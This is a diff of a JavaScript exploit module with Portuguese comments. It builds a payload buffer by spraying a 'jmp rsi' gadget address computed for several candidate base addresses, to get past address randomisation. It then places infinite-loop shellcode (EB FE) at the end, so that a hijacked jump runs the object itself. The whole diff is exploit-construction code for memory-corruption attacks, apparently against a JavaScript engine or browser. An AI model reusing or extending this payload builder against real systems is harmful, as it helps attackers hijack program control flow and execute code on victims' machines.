@@ -1,3 +1,4 @@
+
 import { CONFIG, GADGETS } from './config.mjs';
 
 export function build_universal_payload(size) {
@@ -6,27 +7,28 @@ export function build_universal_payload(size) {
 
     // ESTRATÉGIA "RAINBOW":
     // Preenchemos o objeto repetindo os endereços de pulo para TODAS as bases.
-    // Padrão: [Gadget_Base1] [Gadget_Base2] [Gadget_Base3] ...
     
     let offset = 0;
+    // Enquanto houver espaço no buffer
     while (offset < size) {
-        for (let base of CONFIG.TARGET_BASES) {
+        // Para cada base possível
+        for (let i = 0; i < CONFIG.TARGET_BASES.length; i++) {
+            let base = CONFIG.TARGET_BASES[i];
+
             if (offset + 8 > size) break;
 
-            // Calcula o endereço do gadget JMP RSI para esta base
+            // Calcula: Base + Gadget de Pulo
             let gadget_addr = base + GADGETS.jmp_rsi;
             
-            // Escreve no buffer
+            // Escreve endereço de 64 bits
             view.setBigUint64(offset, gadget_addr, true); // Little Endian
             offset += 8;
         }
     }
     
-    // INJEÇÃO DE SHELLCODE (Payload Passivo)
-    // Colocamos o "Infinite Loop" (EB FE) no final do objeto.
-    // Se o gadget funcionar, ele pula para RSI (este objeto) e executa o loop.
-    
-    // Offset seguro no final (últimos 16 bytes)
+    // LOOP INFINITO (EB FE) NO FINAL
+    // Se o pulo funcionar, ele executa o que está em RSI (o próprio objeto).
+    // Colocamos o loop no final para travar a CPU.
     const code_pos = size - 16;
     if (code_pos > 0) {
         view.setUint8(code_pos, 0xEB);
